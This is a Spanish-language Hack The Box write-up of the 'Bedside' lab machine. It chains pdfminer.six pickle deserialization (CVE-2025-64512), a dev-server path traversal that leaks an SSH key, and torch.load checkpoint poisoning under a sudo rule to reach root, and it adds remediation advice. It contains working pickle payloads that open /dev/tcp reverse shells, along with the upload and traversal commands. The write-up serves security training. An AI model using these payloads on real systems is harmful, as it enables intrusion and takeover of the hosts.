# Writeup — HTB "Bedside" (bedside.htb)

**Objetivo:** bedside.htb / research.bedside.htb
**IP final:** 10.129.148.193 (la máquina se re-desplegó durante el engagement
**Resultado:** Compromiso total — `user` (developer) y `root`.
**Flag root:** `45f221***********************`
**Metodología:** PTES / OWASP WSTG / NIST SP 800-115

---

## 1. Resumen ejecutivo

La máquina "Bedside" simula una clínica con un portal de investigación que permite subir imágenes médicas y documentos para entrenamiento de IA. La superficie web expone un **worker de conversión de PDFs vulnerable a deserialización insegura (CVE-2025-64512)**, que da ejecución de código remoto. Desde ahí se compromete el contenedor de la aplicación (`datawrangler`), se reutiliza un **path traversal** en un servidor de desarrollo expuesto para exfiltrar una **clave privada SSH**, se accede como `developer`, y finalmente se abusa de una regla **sudo NOPASSWD** sobre un script Python que carga checkpoints con **`torch.load(weights_only=False)`** para inyectar un checkpoint malicioso y obtener **root**.

Cadena: **RCE web → contenedor app → traversal → SSH key → developer → checkpoint poisoning → root.**

---

## 2. Alcance y reglas

- Alcance autorizado: máquina de laboratorio HTB `bedside.htb` + `research.bedside.htb`.
- Exclusión: nada fuera del host indicado.

---

## 3. Reconocimiento

- Puertos (sesión final): `22/tcp ssh`, `80/tcp http`. `443` cerrado (en sesiones previas el portal estaba en HTTPS/443; tras el re-despliegue quedó en **HTTP/80**).
- Portal en `http://research.bedside.htb/`: "Bedside Research Portal", formulario de subida **`POST /`**, campo **`uploadFile`**, `multipart/form-data`, sin CSRF, sin JS.
- Whitelist de extensiones: `jpeg, jpg, png, bmp, tiff, dcm, pdf`. Aviso: "Collections can be uploaded as archives" y "Certain file formats may be converted to standardized formats before being used for AI training" → indicio de **worker de conversión asíncrono**.
- En sesiones previas se identificó además un **servidor de desarrollo en `127.0.0.1:3000`** (Vite/esm.sh) corriendo en el **host**, con **path traversal**.

---

## 4. Cadena de explotación

### 4.1 RCE — CVE-2025-64512 (pdfminer.six, deserialización pickle vía CMap)

**Descripción.** `pdfminer.six < 20251107` deserializa ficheros CMap con `pickle.loads()` en `CMapDB._load_data()`. Un PDF puede especificar un **CMap externo con ruta absoluta**; pdfminer le añade el sufijo `.pickle.gz` y lo deserializa. Un pickle malicioso ejecuta código arbitrario al procesar el PDF.

**Vector en Bedside.** El worker `pdf_watcher` (contenedor `data-wrangler`, usuario `datawrangler`, uid 988) procesa periódicamente `*.pdf` del directorio de subidas ejecutando `pdf2txt.py`, lo que dispara el `pickle.loads`.

**Explotación:**
1. Subir `payload.pickle.gz` (pickle `__reduce__` → reverse shell) — **el filtro de subida no bloquea `.pickle.gz`**:
   ```bash
   curl -s -F "uploadFile=@payload.pickle.gz;filename=payload.pickle.gz" http://research.bedside.htb/
   ```
   Queda en `/var/www/research.bedside.htb/uploads/payload.pickle.gz`.
2. Subir un PDF trigger con **nombre fresco** (el worker salta PDFs ya procesados). El objeto Font lleva:
   `/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fpayload` (`/` → `#2F`) → pdfminer carga `/var/www/research.bedside.htb/uploads/payload.pickle.gz`.
   ```bash
   curl -s -F "uploadFile=@trigger.pdf;filename=trigger_$(date +%s).pdf" http://research.bedside.htb/
   ```
3. En el siguiente ciclo del worker (~30 s) → `pickle.loads` → **reverse shell como `datawrangler`** (uid 988, gid dataops).

**Payload (pickle):**
```python
class ShellPayload:
    def __reduce__(self):
        cmd = "bash -i >& /dev/tcp/10.10.X.X/4444 0>&1"
        code = "__import__('subprocess').Popen(['bash','-c',%r],start_new_session=True) and {}" % cmd
        return (eval, (code,))
```
> `start_new_session=True` desacopla del process group (sobrevive al `timeout` del worker); devolver `{}` evita un error inmediato en pdfminer.

**Severidad:** CVSS 3.1 **9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

### 4.2 Exfiltración de clave SSH vía path traversal (dev server `:3000`)

El servidor de desarrollo en `127.0.0.1:3000` corre en el **host** y sirve ficheros sin bloquear `..`:
```
GET /../../../../home/developer/.ssh/id_rsa   → 200
```
Se exfiltra la clave privada ED25519 `developer@bedside`. Con ella se accede por SSH como `developer` (uid 1000).

**Severidad:** CVSS 3.1 **7.5 High** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

### 4.3 Escalada de privilegios — Checkpoint poisoning (torch.load)

**Enumeración.** `sudo -l` de `developer`:
```
(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

**Análisis del script** `/opt/trainer/bedside_trainer.py` (MONAI trainer):
- `find_latest_checkpoint()` → el `*.pt` **más reciente por mtime** en `/datastore/checkpoints`.
- `CheckpointLoader(...)(engine)` → **`torch.load(..., weights_only=False)`**.
- El script se ejecuta **como root** vía sudo.
- Precondición de flujo: `build_model()` **itera el dataloader (`LoadImaged`) antes** de cargar el checkpoint → debe existir al menos una **imagen válida** en `/datastore/processed`.

**Condiciones confirmadas:**
| Requisito | Estado |
|---|---|
| `torch.load` deserializa pickle | `torch 2.5.0+cpu` (default `weights_only=False`) |
| El loader no fuerza `weights_only=True` | `monai 1.5.0` `CheckpointLoader` **pasa `weights_only=False` explícito** (`monai/handlers/checkpoint_loader.py:125`) |
| El script corre como root | `sudo NOPASSWD` |
| Dir de checkpoints escribible | `/datastore/checkpoints` = `drwxrwx--- datawrangler:dataops` (escribible por `datawrangler`, no por `developer`) |

**Explotación (desde la shell `datawrangler`):**
1. Escribir el checkpoint malicioso (pickle `__reduce__` → reverse shell root, desprendido):
   `/datastore/checkpoints/checkpoint_epoch_9999.pt`
   ```python
   class RootPayload:
       def __reduce__(self):
           sh = "bash -i >& /dev/tcp/10.10.X.X/4445 0>&1"
           code = ("__import__('subprocess').Popen(['bash','-c',%r],start_new_session=True) "
                   "and __import__('os').system('cp /root/root.txt /tmp/root_proof.txt; chmod 644 /tmp/root_proof.txt') and {}" % sh)
           return (eval, (code,))
   ```
2. Colocar una **imagen válida** `/datastore/processed/img.png` (PNG 64×64) para que `build_model` no rompa antes del load.
3. Disparar:
   ```bash
   ssh developer@bedside.htb 'sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py'
   ```
   → `CheckpointLoader` → `torch.load(weights_only=False)` → **RCE como root**.

**Severidad:** CVSS 3.1 **7.8 High** — `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (privesc local desde `developer`)

---

## 5. Evidencia

| Item | Valor |
|---|---|
| Shell intermedia | `datawrangler@data-wrangler:/app` — `uid=988(datawrangler) gid=1001(dataops)` |
| Shell final | `root@bedside:/home/developer#` — `uid=0(root) gid=0(root)` |
| Flag root | `45f2**********************` |
| md5 `.pt` malicioso | `cb712ae816eedf4d086c01f1b646f3aa` |
| md5 `img.png` | `061aed25841ba07f0bbb53e6c3d81cea` |

Artefactos locales: `/tmp/opencode/bedside/` (`gen_payloads.py`, `gen_pdf.py`, `payload.pickle.gz`, `trigger.pdf`, `root.pt`, `img.png`, `shell.log`, `shell_root.log`).

---

## 6. Hallazgos y severidad

| # | Hallazgo | Severidad | CVSS |
|---|---|---|---|
| 1 | RCE por deserialización pickle en pdfminer.six (CVE-2025-64512) en el worker de conversión | Crítica | 9.8 |
| 2 | Path traversal en dev server (`:3000`) que expone el FS del host → exfiltración de clave SSH | Alta | 7.5 |
| 3 | Escalada de privilegios local por `torch.load(weights_only=False)` sobre checkpoint en dir escribible + `sudo NOPASSWD` | Alta | 7.8 |
| 4 | Dev server de desarrollo expuesto en el host (`:3000`) | Media | 6.5 |
| 5 | Filtro de subida permisivo (acepta `.pickle.gz` / archivos comprimidos sin validar contenido) | Media | 5.3 |

---

## 7. Remediación

**Hallazgo 1 — pdfminer.six (CVE-2025-64512):**
- Actualizar `pdfminer.six` a **≥ 20251107**.
- Ejecutar el worker con usuario sin privilegios y en sandbox (contenedor/namespace) con FS de solo lectura salvo su directorio de trabajo.
- Validar el contenido de los ficheros subidos (no solo la extensión) y almacenarlos fuera de rutas referenciables por el PDF.

**Hallazgo 2 y 4 — dev server / traversal:**
- No exponer servidores de desarrollo en el host. Si es imprescindible, bind a `127.0.0.1` y filtrar `..`.
- Endurecer permisos de `/home/*/.ssh` (claves privadas solo lectura del dueño).

**Hallazgo 3 — checkpoint poisoning / sudo:**
- Aplicar **`torch.load(..., weights_only=True)`** o `safetensors` para los checkpoints.
- Restringir la regla `sudo` a lo estrictamente necesario; no ejecutar el trainer como root.
- Endurecer permisos de `/datastore/checkpoints` (no escribible por la identidad de la app) y validar/verificar integridad de los checkpoints.

**Hallazgo 5 — upload:**
- Whitelist real de extensiones + verificación de MIME/magic bytes + antivirus/escaneo; rechazar archivos comprimidos no esperados.

---

## 8. Lecciones / notas del operador

- El ciclo del worker (asíncrono) hizo creer en un principio que el vector "no funcionaba"; **la ausencia de conexión inmediata no descarta el vector** — hay que esperar > 1 ciclo y usar nombres frescos.
- `exit 0` silencioso de pdfminer en un exploit fallido es un **falso negativo**: verificar siempre un side-effect explícito (beacon/marcador).
- Tras el re-despliegue, la **clave SSH siguió siendo válida** y el **portal cambió de 443 a 80**: no asumir el estado previo, re-escanear.
- `ssh host sudo script` se queda colgado tras el RCE porque el shell desprendido hereda el pipe stdout del SSH — comportamiento esperado, no un fallo.
